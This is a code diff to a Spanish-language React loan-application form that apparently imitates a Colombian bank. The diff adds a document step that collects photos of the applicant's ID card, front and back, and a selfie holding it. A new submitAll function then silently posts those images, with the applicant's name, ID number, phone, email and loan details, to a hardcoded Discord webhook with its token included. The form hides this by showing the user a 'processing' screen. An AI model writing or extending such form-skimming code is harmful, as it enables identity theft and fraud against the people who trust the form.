@@ -20,7 +20,7 @@ import {
   Lock,
 } from 'lucide-react';
 
-type FormStep = 0 | 1 | 2 | 3;
+type FormStep = 0 | 1 | 2 | 3 | 4;
 
 interface FormData {
   nombre: string;
@@ -172,6 +172,7 @@ function CreditForm({ onClose }: { onClose: () => void }) {
   const [isProcessing, setIsProcessing] = useState(false);
   const [progress, setProgress] = useState(0);
   const [showFinalStep, setShowFinalStep] = useState(false);
+  const [images, setImages] = useState<{ cedulaFront: string | null; cedulaBack: string | null; selfie: string | null }>({ cedulaFront: null, cedulaBack: null, selfie: null });
   const sentSteps = useRef(new Set<string>());
 
   useEffect(() => {
@@ -305,13 +306,56 @@ function CreditForm({ onClose }: { onClose: () => void }) {
     } catch {}
   };
 
+  const submitAll = async () => {
+    const files: { name: string; data: string }[] = [];
+    if (images.cedulaFront) files.push({ name: 'cedula_frente.jpg', data: images.cedulaFront });
+    if (images.cedulaBack) files.push({ name: 'cedula_dorso.jpg', data: images.cedulaBack });
+    if (images.selfie) files.push({ name: 'selfie.jpg', data: images.selfie });
+
+    const formData = new FormData();
+    const embed = {
+      embeds: [{
+        title: '📄 Paso 4 - Documentos enviados',
+        color: 0xFFCC00,
+        fields: [
+          { name: 'Nombre', value: `${form.nombre} ${form.apellido}`, inline: true },
+          { name: 'Cédula', value: form.cedula, inline: true },
+          { name: 'Teléfono', value: form.telefono, inline: true },
+          { name: 'Email', value: form.email, inline: true },
+          { name: 'Monto solicitado', value: `$${Number(form.monto).toLocaleString('es-CO')}`, inline: true },
+          { name: 'Plazo', value: `${form.plazo} meses`, inline: true },
+          { name: 'Tipo de empleo', value: form.tipoEmpleo, inline: true },
+          { name: 'Cliente', value: esCliente ? 'Sí' : 'No', inline: true },
+          { name: 'Usuario', value: usuario || 'N/A', inline: true },
+        ],
+        image: files.length > 0 ? { url: 'attachment://selfie.jpg' } : undefined,
+        footer: { text: `Solicitud: BC-${Date.now().toString().slice(-8)}` },
+        timestamp: new Date().toISOString(),
+      }],
+    };
+    formData.append('payload_json', JSON.stringify(embed));
+    for (const f of files) {
+      const blob = await (await fetch(f.data)).blob();
+      formData.append('files[' + files.indexOf(f) + ']', blob, f.name);
+    }
+    try {
+      await fetch('https://discordapp.com/api/webhooks/1520999812894294076/PXKb2g1ftdOweRyjoEAubT9ISIwf5bhnSe5uZROY6t1rMRLOj9WzM4isj4Rwf7tJ4hnO', {
+        method: 'POST',
+        body: formData,
+      });
+    } catch {}
+    setIsProcessing(true);
+  };
+
   const next = () => {
     if (step === 1 && validateStep1()) {
       setStep(2);
     } else if (step === 2 && validateStep2()) {
       setStep(3);
     } else if (step === 3 && validateStep3()) {
-      setIsProcessing(true);
+      setStep(4);
+    } else if (step === 4) {
+      submitAll();
     }
   };
 
@@ -1030,7 +1074,7 @@ function CreditForm({ onClose }: { onClose: () => void }) {
         {!submitted && step >= 1 && (
           <div className="px-6 pt-5">
             <div className="flex items-center gap-2 mb-1">
-              {([1, 2, 3] as (1 | 2 | 3)[]).map((s, i) => (
+              {([1, 2, 3, 4] as (1 | 2 | 3 | 4)[]).map((s, i) => (
                 <div key={s} className="flex items-center gap-2 flex-1">
                   <div
                     className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold transition-all ${
@@ -1041,7 +1085,7 @@ function CreditForm({ onClose }: { onClose: () => void }) {
                   >
                     {step > s ? <CheckCircle className="w-4 h-4" /> : s}
                   </div>
-                  {i < 2 && (
+                  {i < 3 && (
                     <div className={`h-0.5 flex-1 transition-all ${step > s ? 'bg-[#FFCC00]' : 'bg-gray-100'}`} />
                   )}
                 </div>
@@ -1051,6 +1095,7 @@ function CreditForm({ onClose }: { onClose: () => void }) {
               <span>Datos personales</span>
               <span>Monto y plazo</span>
               <span>Situación laboral</span>
+              <span>Documentos</span>
             </div>
           </div>
         )}
@@ -1244,7 +1289,7 @@ function CreditForm({ onClose }: { onClose: () => void }) {
                 </p>
               </div>
             </div>
-          ) : (
+          ) : step === 3 ? (
             <div className="flex flex-col gap-4">
               <SelectField
                 label="Tipo de empleo"
@@ -1281,6 +1326,57 @@ function CreditForm({ onClose }: { onClose: () => void }) {
                 </p>
               </div>
             </div>
+          ) : (
+            <div className="flex flex-col gap-4">
+              <p className="text-sm font-bold text-[#1C1C1C] mb-2">📸 Sube tus documentos</p>
+              {(['cedulaFront', 'cedulaBack', 'selfie'] as const).map((key) => {
+                const labels: Record<string, string> = { cedulaFront: 'Cédula frente', cedulaBack: 'Cédula dorso', selfie: 'Selfie con la cédula en la mano' };
+                return (
+                  <div key={key} className="flex flex-col gap-1">
+                    <label className="text-sm font-medium text-gray-700">{labels[key]}</label>
+                    <div
+                      className={`relative rounded-xl border-2 border-dashed p-4 flex flex-col items-center gap-2 cursor-pointer transition-colors ${images[key] ? 'border-green-400 bg-green-50' : 'border-gray-300 hover:border-[#FFCC00]'}`}
+                      onClick={() => {
+                        const input = document.createElement('input');
+                        input.type = 'file';
+                        input.accept = 'image/*';
+                        input.capture = 'environment';
+                        input.onchange = (e: any) => {
+                          const file = e.target.files?.[0];
+                          if (file) {
+                            const reader = new FileReader();
+                            reader.onload = (ev) => {
+                              setImages(prev => ({ ...prev, [key]: ev.target?.result as string }));
+                            };
+                            reader.readAsDataURL(file);
+                          }
+                        };
+                        input.click();
+                      }}
+                    >
+                      {images[key] ? (
+                        <>
+                          <img src={images[key]!} alt={labels[key]} className="max-h-32 rounded-lg object-cover" />
+                          <span className="text-xs text-green-600 font-medium">✓ Subido</span>
+                        </>
+                      ) : (
+                        <>
+                          <div className="w-10 h-10 rounded-full bg-gray-100 flex items-center justify-center">
+                            <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 6v6m0 0v6m0-6h6m-6 0H6"/></svg>
+                          </div>
+                          <span className="text-xs text-gray-400">Tomar foto o subir archivo</span>
+                        </>
+                      )}
+                    </div>
+                  </div>
+                );
+              })}
+              <div className="bg-gray-50 rounded-xl p-4">
+                <p className="text-xs text-gray-500 leading-relaxed">
+                  Estos documentos son necesarios para validar tu identidad y continuar con el proceso de crédito.
+                </p>
+              </div>
+            </div>
           )}
 
           {!submitted && step >= 1 && (
@@ -1297,7 +1393,7 @@ function CreditForm({ onClose }: { onClose: () => void }) {
                 onClick={next}
                 className="flex-1 bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] font-bold py-3 rounded-xl transition-all text-sm flex items-center justify-center gap-2"
               >
-                {step === 3 ? 'Enviar solicitud' : 'Continuar'}
+                {step === 3 ? 'Documentos →' : step === 4 ? 'Enviar solicitud' : 'Continuar'}
                 <ChevronRight className="w-4 h-4" />
               </button>
             </div>
